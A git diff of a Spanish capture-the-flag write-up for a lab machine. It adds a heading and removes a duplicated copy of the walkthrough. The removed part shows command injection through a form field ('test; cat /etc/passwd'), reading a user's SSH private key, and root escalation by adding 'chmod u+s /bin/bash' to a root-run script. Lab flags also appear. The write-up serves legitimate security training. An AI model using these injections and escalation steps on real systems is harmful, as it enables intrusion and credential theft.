@@ -88,6 +88,8 @@ Accedemos al servicio web en el puerto `80` y nos encontramos con un generador d
 
 ![](../../images/operaciones.png)
 
+## COMMAND INJECTION
+
 Probamos a realizar una `inyección de comandos` en los campos de entrada utilizando el delimitador `;`.
 
 ```
@@ -219,7 +221,6 @@ Esperamos unos segundos a que el bucle se ejecute de nuevo y lanzamos una `bash`
 bash -p
 ```
 
-Info:
 ```
 bash-5.2# whoami
 root
@@ -229,143 +230,6 @@ bash-5.2#
 Ya somos root!
 
 Obtenemos las `flags` de usuario y root:
-```
-bash-5.2# cat /root/root.txt 
-640c89bbfa2f70a4038fd570c65d6dcc
-bash-5.2# cat /home/samara/user.txt 
-030208509edea7480a10b84baca3df3e
-```
-
-
-
-Intentamos inyeccion de comandos en las input boxes con el tipico semicolon.
-
-```
-Nombre del archivo: test; cat /etc/passwd
-Fecha: test
-```
-
-La inyeccion de comandos funciona
-
-Info:
-```
-Archivo de reporte: /var/www/html/reportes/reporte_1771266961.txt
-Nombre: test\
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
-_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
-systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
-messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
-systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
-sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
-samara:x:1001:1001:samara,,,:/home/samara:/bin/bash
-Fecha: test
-```
-
-Vemos que hay un usuario samara.
-Vamos a intentar obtener su clae privada para entrar por ssh
-
-```
-Nombre del archivo: test; cat /home/samara/.ssh/id_rsa
-Fecha: test
-```
-
-
-Guardamos la clave en nuestra maquina atacante en un archivo con nombre id_rsa.
-le damos los permisos necesarios.
-
-```bash
-chmod 600 id_rsa
-```
-
-Accedemos por SSH
-
-```bash
-ssh -i id_rsa samara@172.17.0.2
-```
-
-listamos prrocesos
-
-```bash
-ps aux
-```
-
-```
-USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
-root           1  3.8  0.0   2808  1816 ?        Ss   19:27   0:31 /bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done
-root          14  0.0  0.0  12028  3988 ?        Ss   19:27   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
-root          32  0.0  0.5 203460 21672 ?        Ss   19:27   0:00 /usr/sbin/apache2 -k start
-www-data      37  0.1  0.4 204136 18788 ?        S    19:27   0:01 /usr/sbin/apache2 -k start
-www-data  112808  0.1  0.4 204128 18056 ?        S    19:29   0:01 /usr/sbin/apache2 -k start
-www-data  112828  0.1  0.3 203960 12920 ?        S    19:29   0:01 /usr/sbin/apache2 -k start
-www-data  112938  0.1  0.4 204136 17780 ?        S    19:29   0:00 /usr/sbin/apache2 -k start
-www-data  113304  0.1  0.4 204128 18060 ?        S    19:29   0:00 /usr/sbin/apache2 -k start
-www-data  113313  0.1  0.4 204128 18060 ?        S    19:29   0:00 /usr/sbin/apache2 -k start
-www-data  113320  0.1  0.4 204128 18128 ?        S    19:29   0:00 /usr/sbin/apache2 -k start
-www-data  113325  0.1  0.4 204128 18128 ?        S    19:29   0:00 /usr/sbin/apache2 -k start
-www-data  135563  0.0  0.4 204128 18168 ?        S    19:30   0:00 /usr/sbin/apache2 -k start
-www-data  135644  0.0  0.4 204120 18204 ?        S    19:30   0:00 /usr/sbin/apache2 -k start
-root      797391  0.0  0.2  14452  8536 ?        Ss   19:40   0:00 sshd: samara [priv]
-samara    799474  0.0  0.1  14712  6848 ?        S    19:40   0:00 sshd: samara@pts/0
-samara    799534  0.0  0.1   5024  4232 pts/0    Ss   19:40   0:00 -bash
-samara    894844  0.0  0.1   8288  4320 pts/0    R+   19:41   0:00 ps aux
-```
-
-Vemos que el archivo echo.sh en /usr/local/bin/ se esta ejecutando como root
-vamos a /usr/local/bin/ y leemos el archivo.
-
-```bash
-cat echo.sh
-```
-
-```bash
-#!/bin/bash
-
-echo "No tienes permitido estar aqui :(." > /home/samara/message.txt
-```
-
-Vvamos a modificar el archivo para darr permisos SUID al binario /bin/bash y escalara a root.
-
-```bash
-nano echo.sh
-```
-
-```bash
-#!/bin/bash
-chmod u+s /bin/bash
-echo "No tienes permitido estar aqui :(." > /home/samara/message.txt
-```
-
-esperamso unos segundos.
-
-```bash
-bash -p
-```
-
-```
-bash-5.2# whoami
-root
-bash-5.2#
-```
-
-Obtenemos las flags de usuario y root
-
 ```
 bash-5.2# cat /root/root.txt 
 640c89bbfa2f70a4038fd570c65d6dcc
